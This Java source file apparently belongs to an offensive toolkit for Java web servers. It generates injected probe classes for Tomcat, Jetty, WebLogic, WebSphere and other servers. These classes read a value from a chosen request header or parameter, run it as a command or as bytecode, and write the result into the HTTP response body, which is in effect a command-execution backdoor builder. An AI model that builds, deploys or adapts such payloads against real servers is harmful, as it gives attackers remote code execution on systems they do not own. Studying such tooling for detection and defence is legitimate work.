package com.reajason.javaweb.probe.generator.response;

import com.reajason.javaweb.Constants;
import com.reajason.javaweb.buddy.MethodCallReplaceVisitorWrapper;
import com.reajason.javaweb.buddy.TargetJreVersionVisitorWrapper;
import com.reajason.javaweb.memshell.utils.ShellCommonUtil;
import com.reajason.javaweb.probe.config.ProbeConfig;
import com.reajason.javaweb.probe.config.ResponseBodyConfig;
import com.reajason.javaweb.probe.generator.ByteBuddyShellGenerator;
import com.reajason.javaweb.probe.payload.ByteCodeProbe;
import com.reajason.javaweb.probe.payload.CommandProbe;
import com.reajason.javaweb.probe.payload.response.*;
import net.bytebuddy.ByteBuddy;
import net.bytebuddy.asm.Advice;
import net.bytebuddy.dynamic.DynamicType;

import java.lang.annotation.Retention;
import java.lang.annotation.RetentionPolicy;

import static net.bytebuddy.matcher.ElementMatchers.named;

/**
 * @author ReaJason
 * @since 2025/6/29
 */
public class ResponseBodyGenerator extends ByteBuddyShellGenerator<ResponseBodyConfig> {
    public ResponseBodyGenerator(ProbeConfig probeConfig, ResponseBodyConfig probeContentConfig) {
        super(probeConfig, probeContentConfig);
    }

    @Override
    protected DynamicType.Builder<?> build(ByteBuddy buddy) {
        String name;
        Class<?> getDataFromReqInterceptor;
        if (probeContentConfig.getReqParamName() != null) {
            name = probeContentConfig.getReqParamName();
            getDataFromReqInterceptor = getDataFromReqParamInterceptor.class;
        } else {
            name = probeContentConfig.getReqHeaderName();
            getDataFromReqInterceptor = getDataFromReqHeaderInterceptor.class;
        }
        Class<?> templateClass;
        switch (probeContentConfig.getServer()) {
            case Constants.Server.JETTY:
                templateClass = JettyWriter.class;
                break;
            case Constants.Server.TOMCAT:
            case Constants.Server.JBOSS:
            case Constants.Server.BES:
                templateClass = TomcatWriter.class;
                break;
            case Constants.Server.TONGWEB:
                templateClass = TongWebWriter.class;
                break;
            case Constants.Server.RESIN:
                templateClass = ResinWriter.class;
                break;
            case Constants.Server.UNDERTOW:
                templateClass = UndertowWriter.class;
                break;
            case Constants.Server.GLASSFISH:
            case Constants.Server.INFORSUITE:
                templateClass = GlassFishWriter.class;
                break;
            case Constants.Server.WEBSPHERE:
                templateClass = WebSphereWriter.class;
                break;
            case Constants.Server.WEBLOGIC:
                templateClass = WebLogicWriter.class;
                break;
            case Constants.Server.APUSIC:
                templateClass = ApusicWriter.class;
                break;
            default:
                throw new IllegalArgumentException("responseBody now supported for server: " + probeContentConfig.getServer());
        }

        Class<?> runInterceptor;
        switch (probeConfig.getProbeContent()) {
            case Command:
                runInterceptor = CommandProbe.class;
                break;
            case Bytecode:
                runInterceptor = ByteCodeProbe.class;
                break;
            default:
                throw new IllegalArgumentException("responseBody not supported for probe content: " + probeConfig.getProbeContent());
        }
        return buddy.redefine(templateClass)
                .name(probeConfig.getShellClassName())
                .visit(new TargetJreVersionVisitorWrapper(probeConfig.getTargetJreVersion()))
                .visit(MethodCallReplaceVisitorWrapper.newInstance("getDataFromReq",
                        probeConfig.getShellClassName(), ShellCommonUtil.class.getName()))
                .visit(Advice.withCustomMapping().bind(NameAnnotation.class, name)
                        .to(getDataFromReqInterceptor).on(named("getDataFromReq")))
                .visit(Advice.to(runInterceptor).on(named("run")));
    }

    static class getDataFromReqHeaderInterceptor {
        @Advice.OnMethodExit
        public static void enter(@Advice.Argument(value = 0) Object request,
                                 @NameAnnotation String name,
                                 @Advice.Return(readOnly = false) String ret) throws Exception {
            try {
                ret = ((String) ShellCommonUtil.invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{name}));
            } catch (Exception e) {
                ret = null;
            }
        }
    }

    static class getDataFromReqParamInterceptor {
        @Advice.OnMethodExit
        public static void enter(@Advice.Argument(value = 0) Object request,
                                 @NameAnnotation String name,
                                 @Advice.Return(readOnly = false) String ret) throws Exception {
            try {
                ret = ((String) ShellCommonUtil.invokeMethod(request, "getParameter", new Class[]{String.class}, new Object[]{name}));
            } catch (Exception e) {
                ret = null;
            }
        }
    }

    @Retention(RetentionPolicy.RUNTIME)
    public @interface NameAnnotation {
    }
}




